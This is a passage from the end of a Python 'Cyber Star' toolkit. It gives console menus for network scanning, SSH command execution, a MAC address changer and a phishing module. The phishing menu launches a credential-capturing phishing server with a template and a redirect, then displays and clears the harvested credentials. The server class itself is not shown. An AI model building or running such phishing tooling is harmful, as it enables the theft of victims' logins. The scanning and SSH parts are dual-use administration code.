{Colors.GREEN}[6]{Colors.END} Start GUI (Requires PyQt5)
{Colors.GREEN}[7]{Colors.END} Advanced Tools
{Colors.GREEN}[8]{Colors.END} Exit

"""
        print(menu)
    
    def network_scanner_menu(self):
        """Network scanner submenu"""
        while True:
            print(f"\n{Colors.CYAN}🔍 NETWORK SCANNER{Colors.END}")
            print(f"{Colors.GREEN}[1]{Colors.END} Ping Sweep")
            print(f"{Colors.GREEN}[2]{Colors.END} Port Scan")
            print(f"{Colors.GREEN}[3]{Colors.END} Traceroute")
            print(f"{Colors.GREEN}[4]{Colors.END} Get IP Info")
            print(f"{Colors.GREEN}[5]{Colors.END} Back to Main")
            
            choice = input(f"\n{Colors.YELLOW}Select option: {Colors.END}")
            
            if choice == "1":
                network = input("Enter network (e.g., 192.168.1.0/24): ")
                print(f"Scanning {network}...")
                hosts = self.scanner.ping_sweep(network)
                print(f"Found {len(hosts)} active hosts:")
                for host in hosts:
                    print(f"  • {host}")
            
            elif choice == "2":
                target = input("Enter target IP: ")
                ports = input("Ports to scan (e.g., 1-1024): ") or "1-1024"
                print(f"Scanning {target} ports {ports}...")
                result = self.scanner.port_scan(target, ports)
                
                if result['success']:
                    print(f"Open ports on {target}:")
                    for port in result.get('open_ports', []):
                        print(f"  • {port}")
                else:
                    print(f"Scan failed: {result.get('error')}")
            
            elif choice == "3":
                target = input("Enter target: ")
                print(f"Tracing route to {target}...")
                result = TracerouteTool.traceroute(target)
                print(result)
            
            elif choice == "4":
                ip = input("Enter IP address: ")
                info = self.scanner.get_ip_info(ip)
                print(f"\nInformation for {ip}:")
                for key, value in info.items():
                    if value:
                        print(f"  {key}: {value}")
            
            elif choice == "5":
                break
    
    def ssh_manager_menu(self):
        """SSH manager submenu"""
        while True:
            print(f"\n{Colors.CYAN}🔐 SSH MANAGER{Colors.END}")
            print(f"{Colors.GREEN}[1]{Colors.END} Connect to SSH")
            print(f"{Colors.GREEN}[2]{Colors.END} Execute Command")
            print(f"{Colors.GREEN}[3]{Colors.END} List Connections")
            print(f"{Colors.GREEN}[4]{Colors.END} Disconnect")
            print(f"{Colors.GREEN}[5]{Colors.END} Back to Main")
            
            choice = input(f"\n{Colors.YELLOW}Select option: {Colors.END}")
            
            if choice == "1":
                if not SSH_AVAILABLE:
                    print("SSH not available. Install paramiko.")
                    continue
                
                host = input("Host: ")
                port = int(input("Port [22]: ") or "22")
                username = input("Username: ")
                password = input("Password (leave empty for key): ")
                key_path = input("Key path (optional): ")
                
                success, message = self.ssh_manager.connect(host, port, username, password, key_path)
                print(message)
            
            elif choice == "2":
                if not self.ssh_manager.connections:
                    print("No active connections")
                    continue
                
                print("Active connections:")
                for i, conn_id in enumerate(self.ssh_manager.connections.keys(), 1):
                    print(f"  {i}. {conn_id}")
                
                conn_choice = input("Select connection (number): ")
                try:
                    conn_id = list(self.ssh_manager.connections.keys())[int(conn_choice)-1]
                    command = input("Command to execute: ")
                    
                    success, output = self.ssh_manager.execute(conn_id, command)
                    if success:
                        print(f"Output:\n{output}")
                    else:
                        print(f"Error: {output}")
                except:
                    print("Invalid selection")
            
            elif choice == "3":
                print("Active SSH connections:")
                for conn_id in self.ssh_manager.connections.keys():
                    print(f"  • {conn_id}")
            
            elif choice == "4":
                if not self.ssh_manager.connections:
                    print("No active connections")
                    continue
                
                for conn_id in list(self.ssh_manager.connections.keys()):
                    self.ssh_manager.connections[conn_id].close()
                self.ssh_manager.connections.clear()
                print("All connections closed")
            
            elif choice == "5":
                break
    
    def phishing_tools_menu(self):
        """Phishing tools submenu"""
        while True:
            print(f"\n{Colors.CYAN}🎣 PHISHING TOOLS{Colors.END}")
            print(f"{Colors.GREEN}[1]{Colors.END} Start Phishing Server")
            print(f"{Colors.GREEN}[2]{Colors.END} Stop Phishing Server")
            print(f"{Colors.GREEN}[3]{Colors.END} View Captured Data")
            print(f"{Colors.GREEN}[4]{Colors.END} Clear Captured Data")
            print(f"{Colors.GREEN}[5]{Colors.END} Back to Main")
            
            choice = input(f"\n{Colors.YELLOW}Select option: {Colors.END}")
            
            if choice == "1":
                port = int(input("Port [8080]: ") or "8080")
                template = input("Template [default]: ") or "default"
                redirect = input("Redirect URL [https://example.com]: ") or "https://example.com"
                
                self.phishing_server = PhishingServer(port, template, redirect)
                success, message = self.phishing_server.start()
                print(message)
            
            elif choice == "2":
                if self.phishing_server and self.phishing_server.running:
                    self.phishing_server.running = False
                    print("Phishing server stopped")
                else:
                    print("No running server")
            
            elif choice == "3":
                if self.phishing_server and hasattr(self.phishing_server, 'captured_credentials'):
                    creds = self.phishing_server.captured_credentials
                    if creds:
                        print("Captured credentials:")
                        for cred in creds:
                            print(f"  • {cred}")
                    else:
                        print("No credentials captured")
                else:
                    print("No server or no data")
            
            elif choice == "4":
                if self.phishing_server:
                    self.phishing_server.captured_credentials = []
                    print("Data cleared")
            
            elif choice == "5":
                break
    
    def system_info(self):
        """Display system information"""
        print(f"\n{Colors.CYAN}💻 SYSTEM INFORMATION{Colors.END}")
        print(f"OS: {platform.system()} {platform.release()}")
        print(f"CPU Cores: {psutil.cpu_count()}")
        print(f"CPU Usage: {psutil.cpu_percent()}%")
        
        mem = psutil.virtual_memory()
        print(f"Memory: {mem.percent}% used ({mem.used//1024//1024}MB / {mem.total//1024//1024}MB)")
        
        disk = psutil.disk_usage('/')
        print(f"Disk: {disk.percent}% used")
        
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            print(f"Hostname: {hostname}")
            print(f"Local IP: {local_ip}")
        except:
            print("Network: Unable to determine")
    
    def database_tools_menu(self):
        """Database tools submenu"""
        while True:
            print(f"\n{Colors.CYAN}🗄️ DATABASE TOOLS{Colors.END}")
            print(f"{Colors.GREEN}[1]{Colors.END} View Command History")
            print(f"{Colors.GREEN}[2]{Colors.END} Clear History")
            print(f"{Colors.GREEN}[3]{Colors.END} Export Data")
            print(f"{Colors.GREEN}[4]{Colors.END} Back to Main")
            
            choice = input(f"\n{Colors.YELLOW}Select option: {Colors.END}")
            
            if choice == "1":
                conn = sqlite3.connect(DATABASE_FILE)
                cursor = conn.cursor()
                cursor.execute("SELECT command, source, timestamp FROM command_history ORDER BY timestamp DESC LIMIT 20")
                history = cursor.fetchall()
                conn.close()
                
                if history:
                    print("Recent Command History:")
                    for cmd, src, ts in history:
                        print(f"  [{ts}] {src}: {cmd}")
                else:
                    print("No history found")
            
            elif choice == "2":
                confirm = input("Clear all history? (yes/no): ")
                if confirm.lower() == 'yes':
                    conn = sqlite3.connect(DATABASE_FILE)
                    cursor = conn.cursor()
                    cursor.execute("DELETE FROM command_history")
                    conn.commit()
                    conn.close()
                    print("History cleared")
            
            elif choice == "3":
                filename = f"export_{int(time.time())}.json"
                export_data = {
                    'export_time': datetime.now().isoformat(),
                    'system_info': 'Export completed'
                }
                
                with open(filename, 'w') as f:
                    json.dump(export_data, f, indent=2)
                
                print(f"Data exported to {filename}")
            
            elif choice == "4":
                break
    
    def advanced_tools_menu(self):
        """Advanced tools submenu"""
        while True:
            print(f"\n{Colors.CYAN}⚡ ADVANCED TOOLS{Colors.END}")
            print(f"{Colors.GREEN}[1]{Colors.END} MAC Address Changer")
            print(f"{Colors.GREEN}[2]{Colors.END} Packet Sniffer")
            print(f"{Colors.GREEN}[3]{Colors.END} ARP Spoof Detector")
            print(f"{Colors.GREEN}[4]{Colors.END} DNS Spoof Detector")
            print(f"{Colors.GREEN}[5]{Colors.END} Back to Main")
            
            choice = input(f"\n{Colors.YELLOW}Select option: {Colors.END}")
            
            if choice == "1":
                self.mac_changer()
            
            elif choice == "5":
                break
            else:
                print("Feature coming soon!")
    
    def mac_changer(self):
        """MAC address changer"""
        print(f"\n{Colors.YELLOW}⚠️ This feature requires root/admin privileges{Colors.END}")
        
        if platform.system() == "Linux":
            interface = input("Network interface (e.g., eth0, wlan0): ")
            new_mac = input("New MAC address (e.g., 00:11:22:33:44:55): ")
            
            print(f"Changing MAC address for {interface} to {new_mac}...")
            
            try:
                subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
                subprocess.run(["sudo", "ifconfig", interface, "hw", "ether", new_mac], check=True)
                subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
                print("✅ MAC address changed successfully")
            except subprocess.CalledProcessError:
                print("❌ Failed to change MAC address. Run with sudo.")
        else:
            print("MAC changer only available on Linux")
    
    def start_gui(self):
        """Start GUI interface"""
        if GUI_AVAILABLE:
            app = QApplication(sys.argv)
            window = CyberStarGUI()
            window.show()
            sys.exit(app.exec_())
        else:
            print(f"{Colors.RED}GUI not available. Install PyQt5:{Colors.END}")
            print("  pip install pyqt5")
    
    def run(self):
        """Main console loop"""
        self.print_banner()
        
        while True:
            self.print_menu()
            choice = input(f"\n{Colors.YELLOW}Select option: {Colors.END}")
            
            if choice == "1":
                self.network_scanner_menu()
            elif choice == "2":
                self.ssh_manager_menu()
            elif choice == "3":
                self.phishing_tools_menu()
            elif choice == "4":
                self.system_info()
            elif choice == "5":
                self.database_tools_menu()
            elif choice == "6":
                self.start_gui()
            elif choice == "7":
                self.advanced_tools_menu()
            elif choice == "8":
                print(f"\n{Colors.GREEN}👋 Thank you for using Cyber Star!{Colors.END}")
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.END}")

# ==================== MAIN ENTRY POINT ====================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="Accurate Cyber Star Ultimate Edition")
    parser.add_argument('--gui', action='store_true', help='Start GUI interface')
    parser.add_argument('--console', action='store_true', help='Start console interface')
    parser.add_argument('--scan', type=str, help='Quick network scan')
    parser.add_argument('--ping', type=str, help='Quick ping')
    
    args = parser.parse_args()
    
    # Quick commands
    if args.scan:
        scanner = NetworkScanner()
        result = scanner.port_scan(args.scan)
        print(json.dumps(result, indent=2))
        return
    
    if args.ping:
        scanner = NetworkScanner()
        success = scanner.ping(args.ping)
        print(f"Ping {args.ping}: {'✅ SUCCESS' if success else '❌ FAILED'}")
        return
    
    # Main interfaces
    if args.gui and GUI_AVAILABLE:
        app = QApplication(sys.argv)
        window = CyberStarGUI()
        window.show()
        sys.exit(app.exec_())
    
    elif args.console or not args.gui:
        console = CyberStarConsole()
        console.run()
    
    else:
        print("Please specify --gui or --console")

if __name__ == "__main__":
    main()